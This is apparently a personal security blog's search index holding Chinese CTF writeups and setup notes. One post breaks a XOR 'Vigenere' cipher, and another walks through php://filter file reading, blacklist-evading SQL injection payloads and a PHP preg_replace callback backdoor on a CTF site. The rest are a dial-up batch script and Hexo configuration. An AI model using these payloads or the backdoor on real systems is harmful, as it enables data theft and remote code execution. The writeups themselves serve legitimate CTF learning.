<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[南邮CTF平台 Vigenere writeup]]></title>
    <url>%2F2017%2F10%2Fnupt-vigenere%2F</url>
    <content type="text"><![CDATA[本文表述基于个人理解，谬误在所难免，欢迎邮件交流。 题目 It is said that Vigenere cipher does not achieve the perfect secrecy actually :-) Tips: 1.The encode pragram is given; 2.Do u no index of coincidence ？ 3.The key is last 6 words of the plain text(with “nctf{}” when submitted, also without any interpunction) encode.cpp code.txt 什么是异或异或（exclusive or）是二元逻辑运算符，符号为 XOR 或 EOR 或 ⊕或 ^ 。对于表达式 a^b 的取值，当且仅当a、b逻辑值不同时为真。具体来说就是四个式子：1^1=0; 0^0=0; 1^0=1; 0^1=1 。另外，异或有一些基本的特性，本题仅用到第七行的特性即可。 1234567891011121314a^a=0;a^0=a;a^b=b^a;a^(b^c)=(a^b)^c;a^b^b=a;------------------------------------------如果 cipher = plain ^ key，那么 plain = cipher ^ key简单地证明一下： c = p ^ k --&gt; c ^ k = p ^ k ^ k --&gt; c ^ k = p------------------------------------------一个以字节为单位进行异或的例子： 97^98 --&gt; 01100001 ^ 01100010 = 00000011 -&gt; 3 概念我们知道，英文中的每个字母使用频率是不同的，在够长的一段话里，各个字母的占比大致稳定，并且这个稳定值也已经用巨大的语料库统计出来了，这就是字母频率。这种统计层面的现象，就给我们提供了判断一段文字是否可能有意义的依据，并且这种判断可以通过编程轻松完成。然而，给定两个字母组合，只计算出其中各字母的占比是不够的，想要准确高效地比较两段文字谁更可能具备有意义的语义，我们最好算出一个归一化参数，用以直观表示可能性的大小，这就是文中提到的 correlation ，计算公式也是有的， ，其中n(i)指字母i在一段话的所有字母中所占的比例，f(i)就是已经统计出来的i字母的频率，具体如下所示。 字母频率列表： 123456frequencies = &#123;"e": 0.12702, "t": 0.09056, "a": 0.08167, "o": 0.07507, "i": 0.06966, "n": 0.06749, "s": 0.06327, "h": 0.06094, "r": 0.05987, "d": 0.04253, "l": 0.04025, "c": 0.02782, "u": 0.02758, "m": 0.02406, "w": 0.02360, "f": 0.02228, "g": 0.02015, "y": 0.01974, "p": 0.01929, "b": 0.01492, "v": 0.00978, "k": 0.00772, "j": 0.00153, "x": 0.00150, "q": 0.00095, "z": 0.00074&#125; 解题理解加密题目的加密方式大致等价于这样写： 12345678910# coding:utf8key = [0xba, 0x1f, 0x91, 0xb2, 0x53, 0xcd, 0x3e] # 长度范围是1-13，当然，我们还不知道key是多少plain = open('ptext.txt').read()cipher = open('ctext.txt', 'w+')c = ''k = 0for p in plain: c += hex(ord(p) ^ key[k])[2:].zfill(2) k = (k + 1) % len(key)cipher.write(c) 程序意思是将明文和密钥逐字节异或，每次异或后的值用两位十六进制表示写入文件，也就是我们见到的code.txt，在这个过程中，密钥是循环使用的。 那么现在情况是这样的，我们知道： 密钥的长度区间为1-13字节 加密方式为逐字节循环异或 加密结果，即密文的完整内容 我们想知道 明文内容 密钥内容 (⊙﹏⊙) 这看起来有点困难。 不过，其实还有两个不言而喻但非常重要的信息 明文的每一个字节都是可见字符。 明文是一段有意义的话。 解密代码主程序先放个主程序，和下面的对照着看。全部代码在文章底部 。 123456789101112131415def main(): ps = [] ks = [] ss = [] ps.extend(xrange(32, 127)) ks.extend(xrange(0xff + 1)) ss.extend(xrange(1, 14)) cipher = getCipher() keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks) for i in keyPool: freq = getFrequency(cipher, keyPool[i]) key = analyseFrequency(freq) plain = vigenereDecrypt(cipher, key) print key, plain 确定密钥的长度和候选字符集明文由可见字符组成。这意味着任何一个使明文出现不可见字符的值都不可能出现在key里。依据此可以取得两个进展。 求出key的每一个字节有哪些候选字符。具体操作：当我们假设某一字节的key的值时，就可以使用前文提到的plain = cipher ^ key 求出这一字节密文对应的明文，如果这个明文是不可见的，那么我们假设的这个值就不可能出现在key的这个字节。因为是循环异或，所以每个字节的key会去加密多个字节的明文，我们就可以如法炮制，大大缩小key的每个字节的候选字符集。 在1的基础上，确定key可能有哪几种长度。具体操作：我们假设key每一种可能的长度，一一去求对应的候选字符集， 如果有一种长度的key在某一字节的候选字符集为空，那么key就不可能是这个长度。 至此，我们可以从无到有求得 key有哪些可能的长度 以及 key在每一种长度下对应的每个字节的候选字符集 。 上代码： 1234567891011121314151617181920212223242526272829303132def getKeyPool(cipher, stepSet, plainSet, keySet): ''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33] 返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值， 密钥字符集为数字列表。 形如&#123; 1:[[0x11]], 3:[ [0x11,0x33,0x46], [0x22,0x58], [0x33] ] &#125; ''' keyPool = dict() for step in stepSet: maybe = [None] * step for pos in xrange(step): maybe[pos] = [] for k in keySet: flag = 1 for c in cipher[pos::step]: if c ^ k not in plainSet: flag = 0 if flag: maybe[pos].append(k) for posPool in maybe: if len(posPool) == 0: maybe = [] break if len(maybe) != 0: keyPool[step] = maybe return keyPool 遍历候选字符集，求出对应的字频这虽是个体力活，却也得小心翼翼。 123456789101112131415161718192021222324def getFrequency(cipher, keyPoolList): ''' 传入的密文作为数字列表处理 传入密钥的字符集应为列表，依次包含各字节字符集。 形如[[0x11,0x12],[0x22]] 返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频 形如[&#123; 0x11:&#123;'a':2,'b':3&#125;, 0x12:&#123;'e':6&#125; &#125;, &#123; 0x22:&#123;'g':1&#125; &#125;] ''' freqList = [] keyLen = len(keyPoolList) for i in xrange(keyLen): posFreq = dict() for k in keyPoolList[i]: posFreq[k] = dict() for c in cipher[i::keyLen]: p = chr(k ^ c) posFreq[k][p] = posFreq[k][p] + 1 if p in posFreq[k] else 1 freqList.append(posFreq) return freqList 根据字频求得密钥明文是一段有意义的话。这意味着它算出来的correlation值一定是所有候选明文中最大的，依照这一点就能挑出密钥每个字节的值，从而得到整个密钥。这也是整个解密过程最核心的一部分。 12345678910111213141516171819202122232425262728293031323334def calCorrelation(cpool): '''传入字典，形如&#123;'e':2,'p':3&#125; 返回可能性，0~1,值越大可能性越大 (correlation between the decrypted column letter frequencies and the relative letter frequencies for normal English text) ''' frequencies = &#123;"e": 0.12702, "t": 0.09056, "a": 0.08167, "o": 0.07507, "i": 0.06966, "n": 0.06749, "s": 0.06327, "h": 0.06094, "r": 0.05987, "d": 0.04253, "l": 0.04025, "c": 0.02782, "u": 0.02758, "m": 0.02406, "w": 0.02360, "f": 0.02228, "g": 0.02015, "y": 0.01974, "p": 0.01929, "b": 0.01492, "v": 0.00978, "k": 0.00772, "j": 0.00153, "x": 0.00150, "q": 0.00095, "z": 0.00074&#125; relative = 0.0 total = 0 fpool = 'etaoinshrdlcumwfgypbvkjxqz' total = sum(cpool.values()) # 总和应包括字母和其他可见字符 for i in cpool.keys(): if i in fpool: relative += frequencies[i] * cpool[i] / total return relativedef analyseFrequency(cfreq): key = [] for posFreq in cfreq: mostRelative = 0 for keyChr in posFreq.keys(): r = calCorrelation(posFreq[keyChr]) if r &gt; mostRelative: mostRelative = r keychar = keyChr key.append(keychar) return key 根据密钥解密求出密钥剩下的就好办了。 12345678def vigenereDecrypt(cipher, key): plain = '' cur = 0 ll = len(key) for c in cipher: plain += chr(c ^ key[cur]) cur = (cur + 1) % ll return plain 一些数据可能的密钥长度和对应字符集123456789101112131415&#123;7: [[162, 165, 168, 169, 170, 174, 175, 178, 179, 180, 184, 185, 186, 187, 189, 190, 191], [0, 2, 10, 11, 12, 17, 21, 23, 25, 26, 27, 28, 29, 30, 31, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95], [132, 133, 142, 144, 145, 146, 147, 148, 149, 150, 155, 159, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223], [161, 166, 167, 170, 173, 176, 177, 178, 179, 180, 181, 182, 183, 186, 188], [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 68, 70, 72, 76, 78, 80, 81, 82, 83, 84, 86, 87, 90, 93], [128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 195, 196, 200, 201, 202, 204, 205, 206, 207, 208, 210, 213, 216, 217, 223], [33, 39, 43, 44, 52, 55, 57, 58, 59, 60, 61, 62, 63]]&#125; 最后结果12[186, 31, 145, 178, 83, 205, 62] Cryptography is the practice and study of techniques for, among other things, secure communication in the presence of attackers. Cryptography has been used for hundreds, if not thousands, of years, but traditional cryptosystems were designed and evaluated in a fairly ad hoc manner. For example, the Vigenere encryption scheme was thought to be secure for decades after it was invented, but we now know, and this exercise demonstrates, that it can be broken very easily.[Finished in 2.2s] 解密代码全文123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135# coding:utf8def getCipher(file='code.txt'): '''从文件中读取十六进制串，返回十六进制数组 ''' c = open(file).read() codeintlist = [] codeintlist.extend( (map(lambda i: int(c[i:i + 2], 16), range(0, len(c), 2)))) return codeintlistdef getKeyPool(cipher, stepSet, plainSet, keySet): ''' 传入的密文串、明文字符集、密钥字符集、密钥长度范围均作为数字列表处理.形如[0x11,0x22,0x33] 返回一个字典，以可能的密钥长度为键，以对应的每一字节的密钥字符集构成的列表为值，密钥字符集为数字列表。 形如&#123; 1:[[0x11]], 3:[ [0x11,0x33,0x46], [0x22,0x58], [0x33] ] &#125; ''' keyPool = dict() for step in stepSet: maybe = [None] * step for pos in xrange(step): maybe[pos] = [] for k in keySet: flag = 1 for c in cipher[pos::step]: if c ^ k not in plainSet: flag = 0 if flag: maybe[pos].append(k) for posPool in maybe: if len(posPool) == 0: maybe = [] break if len(maybe) != 0: keyPool[step] = maybe return keyPooldef calCorrelation(cpool): '''传入字典，形如&#123;'e':2,'p':3&#125; 返回可能性，0~1,值越大可能性越大 (correlation between the decrypted column letter frequencies and the relative letter frequencies for normal English text) ''' frequencies = &#123;"e": 0.12702, "t": 0.09056, "a": 0.08167, "o": 0.07507, "i": 0.06966, "n": 0.06749, "s": 0.06327, "h": 0.06094, "r": 0.05987, "d": 0.04253, "l": 0.04025, "c": 0.02782, "u": 0.02758, "m": 0.02406, "w": 0.02360, "f": 0.02228, "g": 0.02015, "y": 0.01974, "p": 0.01929, "b": 0.01492, "v": 0.00978, "k": 0.00772, "j": 0.00153, "x": 0.00150, "q": 0.00095, "z": 0.00074&#125; relative = 0.0 total = 0 fpool = 'etaoinshrdlcumwfgypbvkjxqz' total = sum(cpool.values()) # 总和应包括字母和其他可见字符 for i in cpool.keys(): if i in fpool: relative += frequencies[i] * cpool[i] / total return relativedef analyseFrequency(cfreq): key = [] for posFreq in cfreq: mostRelative = 0 for keyChr in posFreq.keys(): r = calCorrelation(posFreq[keyChr]) if r &gt; mostRelative: mostRelative = r keychar = keyChr key.append(keychar) return keydef getFrequency(cipher, keyPoolList): ''' 传入的密文作为数字列表处理 传入密钥的字符集应为列表，依次包含各字节字符集。 形如[[0x11,0x12],[0x22]] 返回字频列表，依次为各字节字符集中每一字符作为密钥组成部分时对应的明文字频 形如[&#123; 0x11:&#123;'a':2,'b':3&#125;, 0x12:&#123;'e':6&#125; &#125;, &#123; 0x22:&#123;'g':1&#125; &#125;] ''' freqList = [] keyLen = len(keyPoolList) for i in xrange(keyLen): posFreq = dict() for k in keyPoolList[i]: posFreq[k] = dict() for c in cipher[i::keyLen]: p = chr(k ^ c) posFreq[k][p] = posFreq[k][p] + 1 if p in posFreq[k] else 1 freqList.append(posFreq) return freqListdef vigenereDecrypt(cipher, key): plain = '' cur = 0 ll = len(key) for c in cipher: plain += chr(c ^ key[cur]) cur = (cur + 1) % ll return plaindef main(): ps = [] ks = [] ss = [] ps.extend(xrange(32, 127)) ks.extend(xrange(0xff + 1)) ss.extend(xrange(1, 14)) cipher = getCipher() keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks) for i in keyPool: freq = getFrequency(cipher, keyPool[i]) key = analyseFrequency(freq) plain = vigenereDecrypt(cipher, key) print key, plainif __name__ == '__main__': main() 题目备份12345678910111213141516171819202122232425262728293031323334353637http://ctf.nuptsast.com/static/uploads/13706e3281c1fb0c04417d3452cb745b/encode.cpp#include &lt;stdio.h&gt;#define KEY_LENGTH 2 // Can be anything from 1 to 13main()&#123; unsigned char ch; FILE *fpIn, *fpOut; int i; unsigned char key[KEY_LENGTH] = &#123;0x00, 0x00&#125;; /* of course, I did not use the all-0s key to encrypt */ fpIn = fopen("ptext.txt", "r"); fpOut = fopen("ctext.txt", "w"); i=0; while (fscanf(fpIn, "%c", &amp;ch) != EOF) &#123; /* avoid encrypting newline characters */ /* In a "real-world" implementation of the Vigenere cipher, every ASCII character in the plaintext would be encrypted. However, I want to avoid encrypting newlines here because it makes recovering the plaintext slightly more difficult... */ /* ...and my goal is not to create "production-quality" code =) */ if (ch!='\n') &#123; fprintf(fpOut, "%02X", ch ^ key[i % KEY_LENGTH]); // ^ is logical XOR i++; &#125; &#125; fclose(fpIn); fclose(fpOut); return;&#125; ----------------------------------------------------------------------------------http://ctf.nuptsast.com/static/uploads/9a27a6c8b9fb7b8d2a07ad94924c02e5/code.txtF96DE8C227A259C87EE1DA2AED57C93FE5DA36ED4EC87EF2C63AAE5B9A7EFFD673BE4ACF7BE8923CAB1ECE7AF2DA3DA44FCF7AE29235A24C963FF0DF3CA3599A70E5DA36BF1ECE77F8DC34BE129A6CF4D126BF5B9A7CFEDF3EB850D37CF0C63AA2509A76FF9227A55B9A6FE3D720A850D97AB1DD35ED5FCE6BF0D138A84CC931B1F121B44ECE70F6C032BD56C33FF9D320ED5CDF7AFF9226BE5BDE3FF7DD21ED56CF71F5C036A94D963FF8D473A351CE3FE5DA3CB84DDB71F5C17FED51DC3FE8D732BF4D963FF3C727ED4AC87EF5DB27A451D47EFD9230BF47CA6BFEC12ABE4ADF72E29224A84CDF3FF5D720A459D47AF59232A35A9A7AE7D33FB85FCE7AF5923AA31EDB3FF7D33ABF52C33FF0D673A551D93FFCD33DA35BC831B1F43CBF1EDF67F0DF23A15B963FE5DA36ED68D378F4DC36BF5B9A7AFFD121B44ECE76FEDC73BE5DD27AFCD773BA5FC93FE5DA3CB859D26BB1C63CED5CDF3FE2D730B84CDF3FF7DD21ED5ADF7CF0D636BE1EDB79E5D721ED57CE3FE6D320ED57D469F4DC27A85A963FF3C727ED49DF3FFFDD24ED55D470E69E73AC50DE3FE5DA3ABE1EDF67F4C030A44DDF3FF5D73EA250C96BE3D327A84D963FE5DA32B91ED36BB1D132A31ED87AB1D021A255DF71B1C436BF479A7AF0C13AA14794 参考链接 https://en.wikipedia.org/wiki/Index_of_coincidence https://en.wikipedia.org/wiki/One-time_pad https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher https://en.wikipedia.org/wiki/Letter_frequency https://www.lijinma.com/blog/2014/05/29/amazing-xor/ http://blog.csdn.net/qq_31344951/article/details/77934717]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南邮CTF平台综合题2writeup]]></title>
    <url>%2F2017%2F10%2Fnupt-zonghe2%2F</url>
    <content type="text"><![CDATA[非xss题 但是欢迎留言~地址：get the flag 读取源码在页面底部发现一个这样的链接：http://cms.nuptzj.cn/about.php?file=sm.txt ，说明题目提供了读取文件功能，如果使用 file://协议 读取，HTML预留字符会以字符实体显示，看起来不方便，所以也可以编码读取后再本地解码。 12345678910111213http://cms.nuptzj.cn/about.php?file=php://filter/convert.base64-encode/resource=filename在拿到的文件里搜索 ".php" ，顺藤摸瓜，能找到并读取到的文件有： sm.txt about.php index.php passencode.php say.php antixss.php so.php preview.php antiinject.php ----------------------------- 知道有 loginxlcteam目录或文件 和 config.php 但还读不到 ；还不知道有list.php ,xlcteam.php 关于file://协议 file://协议 (RFC8089 )是用来访问本地文件系统的，因为文件系统 是 PHP 使用的默认封装协议，因此在fopen()、 copy()、 file_exists() 、 file_get_contents()和 filesize() 等文件系统函数中是支持的。 在谷歌/火狐浏览器的URL框里输入 file:///D:/ 或者在Linux命令行里敲 lynx file:/// 都可以看到效果。 PHP文档 提供的用法如下： /path/to/file.ext relative/path/to/file.ext fileInCwd.ext C:/path/to/winfile.ext C:\path\to\winfile.ext \smbserver\share\path\to\winfile.ext file:///path/to/file.ext 关于PHP的过滤器(php://filter) php://filter 和 可用的过滤器列表。主要用在数据流内容读取之前做些筛选过滤，可指定过滤器应用在读模式还是写模式，不指定则两者都应用，也可复合使用多个过滤器，使用管道符隔开即可。 对于CTFer典型的用法像是这样： php://filter/read= &lt; filter list to apply to read chain &gt;/resource= &lt; stream to be filtered &gt; php://filter/read=string.toupper|string.rot13/resource=https://findneo.github.io/ php://filter/convert.base64-encode/resource=filename 常用过滤器列表： String Filters string.rot13 string.toupper string.tolower string.strip_tags Conversion Filters convert.base64-encode &amp; convert.base64-decode convert.quoted-printable-encode &amp; convert.quoted-printable-decode Compression Filters Encryption Filters 注入全局搜索 mysql_query ，发现 say.php,so.php,index.php 都存在数据库操作。选择 so.php 下手。 123456789101112131415161718192021222324252627282930313233/*so.php*/&lt;?phpif($_SERVER['HTTP_USER_AGENT']!="Xlcteam Browser")&#123;echo '万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'; exit();&#125;$id=$_POST['soid'];include 'config.php';include 'antiinject.php';include 'antixss.php';$id=antiinject($id);$con = mysql_connect($db_address,$db_user,$db_pass) or die("不能连接到数据库！！".mysql_error());mysql_select_db($db_name,$con);$id=mysql_real_escape_string($id);$result=mysql_query("SELECT * FROM `message` WHERE display=1 AND id=$id");$rs=mysql_fetch_array($result);echo htmlspecialchars($rs['nice']).':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'.antixss($rs['say']).'&lt;br /&gt;';mysql_free_result($result);mysql_free_result($file);mysql_close($con);?&gt;---------------------------------------------------------------------------------------/*antiinject.php*/&lt;?phpfunction antiinject($content)&#123;$keyword=array("select","union","and","from",' ',"'",";",'"',"char","or","count","master","name","pass","admin","+","-","order","=");$info=strtolower($content);for($i=0;$i&lt;=count($keyword);$i++)&#123; $info=str_replace($keyword[$i], '',$info);&#125;return $info;&#125;?&gt; 关注 3、11、14、15行。 burp抓包，修改 User-Agent 字段即可。 antiinject() 过滤规则是按黑名单依次把关键字删除。 用黑名单里最后一个关键字 = 分隔即可绕过对多字符关键字的过滤。 用 /**/ 代替空格符。 单字符关键字不太会弄，也许可以用各种编码绕过，不过我们暂时未必需要，有空格和这些多字符关键字，再加上不在黑名单里的 &lt;&gt;/() 已经可以开始搞事了。 mysql_real_escape_string() 的功能是对\x00, \n, \r, \, &#39;, &quot; , \x1a(撤销键,ctrl+z) 加反斜杠转义，我们不用这些字符就是了。 15行处将处理过的参数直接拼接到查询语句，因为查询结果有多列，又没有逗号可用，不好用内联注入，于是尝试基于逻辑的注入。数据库结构在 sm.txt 已经给出。 12345678910111213141516171819我们想要在数据库执行的查询语句是这样：SELECT * FROM `message` WHERE display=1 AND id=1 and ascii(mid((select userpass from admin)from 1 for 1))&gt;65因为没法用空格，所以实际上是这样：SELECT * FROM `message` WHERE display=1 AND id= 1/**/and/**/ascii(mid((select/**/userpass/**/from/**/admin)from/**/1/**/for/**/1))&gt;65希望经过过滤的 id 值为：1/**/and/**/ascii(mid((select/**/userpass/**/from/**/admin)from/**/1/**/for/**/1))&gt;65向 so.php post过去的参数应该是：soid=1/**/an=d/**/ascii(mid((selec=t/**/userpas=s/**/fro=m/**/admi=n)fro=m/**/1/**/fo=r/**/1))&gt;65使用burp爆破soid=1/**/an=d/**/ascii(mid((selec=t/**/userpas=s/**/fro=m/**/admi=n)fro=m/**/§1§/**/fo=r/**/1))&gt;§65§使用 Cluster Bomb 模式，第一个payload 为 [1-40] ，第二个为 [31,32,47-57](经过几次尝试发现usepass字段只有[ \d] )得到[49,48,50,32,49,49,55,32,57,57,32,49,48,55,32,49,49,52,32,48,49,55,32,49,49,48,32,49,49,54,32,49,49,55]也就是[102 ,117 ,99 ,107 ,114 ,117 ,110 ,116 ,117]即funckruntu，访问loginxlcteam登陆即可进后台得知有管理员留的后门 xlcteam.php ，于是读一下这个文件 意外看别人的writeup时惊喜的发现原来并没有过滤逗号，这意味着可以一次注出来管理员密码！所以深夜里我是有些激动的。 123soid=1/**/an=d/**/0/**/unio=n/**/selec=t/**/null,usernam=e,userpas=s,null/**/fro=m/**/admi=n//当然，在充分掌握数据库结构前需要一些尝试。 使用回调后门回调后门似乎是 phithon 师傅最先这样称呼的，在 创造tips的秘籍——PHP回调后门 里做了具体介绍。 123456789//xlcteam.php&lt;?php$e = $_REQUEST['www'];$arr = array($_POST['wtf'] =&gt; '|.*|e',);array_walk($arr, $e, '');?&gt; //使用菜刀连接即可。 //url : http://cms.nuptzj.cn/xlcteam.php?www=preg_replace //密码: wtf 菜刀连上后拿到所有文件，发现 config.php 里有数据库配置，于是就可以操作整个数据库了。 是的，中午吃的是美味的黄焖鸡 \o/]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>sqli</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令行拨号上网]]></title>
    <url>%2F2017%2F10%2Fcmd-surfnet%2F</url>
    <content type="text"><![CDATA[校园网使用PPPoE拨号上网，每次都通过图形化界面通断网络不太方便，希望能一键上网一键下线，于是写了个小脚本。 配置好相关参数后保存为 C:\Windows\System32\surf.bat ，重启命令行即可使用 surf 命令通断网络，常用的话甚至只要 win+r-&gt;enter就可以自由迅速地上线下线啦。把下面第二十行的注释去掉可以在联网同时打开ss，有些缺憾的是还没有实现断网时退出ss。 流程控制参考了Batch Guide by Terry Newton 。 123456789101112131415161718192021REM 校园网使用PPPoE拨号上网，将文件内容存为 C:\Windows\System32\surf.bat ，可以命令行拨号上网REM 可自行加开ss@echo offset name=net REM 修改net 为拨号连接的名字set phone=13323333333 REM 修改为拨号上网手机号set pass=2333 REM 运营商提供的密码rasdial | findstr 已连接 &gt; nulif errorlevel 1 goto notfoundrem string was foundrasdial %name% /disconnect goto endfind:notfoundrem string was not foundrasdial %name% %phone% %pass%if "%1" neq "" goto :endfindREM start C:\path\to\your\Shadowsocks\Shadowsocks.exe:endfind 2017/10/05 更新代码： 添加第十九行，如果ss已经在运行，只要传入一个参数就不会尝试开启啦。]]></content>
      <categories>
        <category>备忘</category>
      </categories>
      <tags>
        <tag>hacklife</tag>
        <tag>code</tag>
        <tag>Batch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博客搭建与自定义]]></title>
    <url>%2F2017%2F09%2Fhexo-config%2F</url>
    <content type="text"><![CDATA[利用GitHub page和hexo搭建一个个人博客主要分三步： 使用hexo在本地搭建一个可访问的博客。 自定义博客样式。 将博客发布到GitHub page。 hexo本地搭建可访问博客官方文档讲的很详细了。 123456789101112131415161718192021222324252627282930313233#基于Windows 10 ; hexo: 3.3.9 ; next Release 5.0.0#1.安装 Node.js (https://nodejs.org/en/download/)#2.安装 Git for Windows (https://github.com/waylau/git-for-win)#3.安装 hexo# 打开cmd.exenpm install -g hexo-cli#4. 创建博客# 进入想要放博客文件的目录hexo init &lt;folder&gt;cd &lt;folder&gt;npm install# 到此为止已经可以看到效果# hexo clean;hexo g;hexo s [--debug]#5. 自选主题，如next (http://theme-next.iissnan.com/getting-started.html)cd themesgit clone https://github.com/iissnan/hexo-theme-next themes/next# 到此为止目录结构如下.├── _config.yml [站点配置文件]├── ...├── source| ├── _drafts| └── _posts└── themes ├──landscape └──next └──_config.yml [博客配置文件] 自定义博客样式blog/_config.yml1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798### 冒号后注意留空 ### Hexo Configuration## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# Sitetitle: findneosubtitle: focused on cyber securitydescription: ctf,python,web securityauthor: findneolanguage: zh-Hanstimezone: Asia/Shanghai# URL## If your site is put in a subdirectory, set url as 'http://yoursite.com/child' and root as '/child/'url: https://findneo.github.io/root: /permalink: :year/:month/:day/:title/permalink_defaults:# Directorysource_dir: sourcepublic_dir: publictag_dir: tagsarchive_dir: archivescategory_dir: categoriescode_dir: downloads/codei18n_dir: :langskip_render:# Writingnew_post_name: :title.md # File name of new postsdefault_layout: post #############################可自定义 blog\scaffold\post.md内容titlecase: false # Transform title into titlecaseexternal_link: true # Open external links in new tabfilename_case: 0render_drafts: false###############################################################post_asset_folder: true #开启后使用hexo new title会在blog\source\_posts下生成title.md和title文件夹，#将markdown文件中需要用到的图片放到title文件夹里，直接![](name.jpg)引用即可###############################################################relative_link: false #############################别开，会很有趣。。future: truehighlight: enable: true line_number: true auto_detect: false tab_replace: # Home page setting# path: Root path for your blogs index page. (default = '')# per_page: Posts displayed per page. (0 = disable pagination)# order_by: Posts order. (Order by date descending by default)index_generator: path: '' per_page: 10 order_by: -date # Category &amp; Tagdefault_category: uncategorizedcategory_map:tag_map:# Date / Time format## Hexo uses Moment.js to parse and display date## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DDtime_format: HH:mm:ss# Pagination## Set per_page to 0 to disable paginationper_page: 10pagination_dir: page# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: next ###########################填写使用的主题名字# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: git@github.com:findneo/findneo.github.io.git branch: master#########################################local search全局搜索功能##参考 http://theme-next.iissnan.com/third-party-services.html#local-search search: path: search.xml field: all #####索引范围 可选all,post等 format: html limit: 10000 #####最大索引文章数目 blog/themes/next/_config.ymlheme Core Configuration Settings# ---------------------------------------------------------------# Set to true, if you want to fully override the default configuration.# Useful if you don't want to inherit the theme _config.yml configurations.override: true# ---------------------------------------------------------------# Site Information Settings# ---------------------------------------------------------------# Put your favicon.ico into `hexo-site/source/` directory.favicon: /favicon.ico# Set default keywords (Use a comma to separate)keywords: "ctf, python, web security, linux"# Set rss to false to disable feed link.# Leave rss as empty to use site's feed link.# Set rss to specific value if you have burned your feed already.rss:# Specify the date when the site was setupsince: 2017# icon between year and author @Footer# authoricon: heartauthoricon: tint# Footer `powered-by` and `theme-info` copyrightcopyright: false# ---------------------------------------------------------------# SEO Settings# ---------------------------------------------------------------# Canonical, set a canonical link tag in your hexo, you could use it for your SEO of blog.# See: https://support.google.com/webmasters/answer/139066# Tips: Before you open this tag, remember set up your URL in hexo _config.yml ( ex. url: http://yourdomain.com )canonical: true# Change headers hierarchy on site-subtitle (will be main site description) and on all post/pages titles for better SEO-optimization.seo: true# If true, will add site-subtitle to index page, added in main hexo config.# subtitle: Subtitleindex_with_subtitle: false# ---------------------------------------------------------------# Menu Settings# ---------------------------------------------------------------# When running the site in a subdirectory (e.g. domain.tld/blog), remove the leading slash from link value (/archives -&gt; archives).# Usage: `Key: /link/ || icon`# Key is the name of menu item. If translate for this menu will find in languages - this translate will be loaded; if not - Key name will be used. Key is case-senstive.# Value before `||` delimeter is the target link.# Value after `||` delimeter is the name of FontAwesome icon. If icon (with or without delimeter) is not specified, question icon will be loaded.menu: home: / || home about: /about/ || user tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat# Enable/Disable menu icons.menu_icons: enable: true# ---------------------------------------------------------------# Scheme Settings# ---------------------------------------------------------------# Schemesscheme: Muse#scheme: Mist#scheme: Pisces#scheme: Gemini# ---------------------------------------------------------------# Sidebar Settings# ---------------------------------------------------------------# Social Links.# Usage: `Key: permalink || icon`# Key is the link label showing to end users.# Value before `||` delimeter is the target permalink.# Value after `||` delimeter is the name of FontAwesome icon. If icon (with or without delimeter) is not specified, globe icon will be loaded.social: GitHub: https://github.com/findneo || github E-Mail: mailto:1285470533@qq.com || envelope #Google: https://plus.google.com/yourname || google #Twitter: https://twitter.com/yourname || twitter #FB Page: https://www.facebook.com/yourname || facebook #VK Group: https://vk.com/yourname || vk #StackOverflow: https://stackoverflow.com/yourname || stack-overflow #YouTube: https://youtube.com/yourname || youtube #Instagram: https://instagram.com/yourname || instagram #Skype: skype:yourname?call|chat || skypesocial_icons: enable: true icons_only: false transition: false# Blog rollslinks_title: Links#links_layout: blocklinks_layout: inlinelinks: XMU-Ph0en1x: https://ph0en1x.com/ CHYbeta: https://chybeta.github.io/ lzhtony: https://lxpark.com/ Mads: http://blog.madsome.cn/ 中國哲學書電子化計劃: http://ctext.org/zh 太极书馆: http://www.8bei8.com/# Sidebar Avatar# in theme directory(source/images): /images/avatar.gif# in site directory(source/uploads): /uploads/avatar.gifavatar: /images/avatar.png# Table Of Contents in the Sidebartoc: enable: true # Automatically add list number to toc. number: true # If true, all words will placed on next lines if header width longer then sidebar width. wrap: true# Creative Commons 4.0 International License.# http://creativecommons.org/# Available: by | by-nc | by-nc-nd | by-nc-sa | by-nd | by-sa | zero#creative_commons: by-nc-sa#creative_commons: by-nc-sasidebar: # Sidebar Position, available value: left | right position: left #position: right # Sidebar 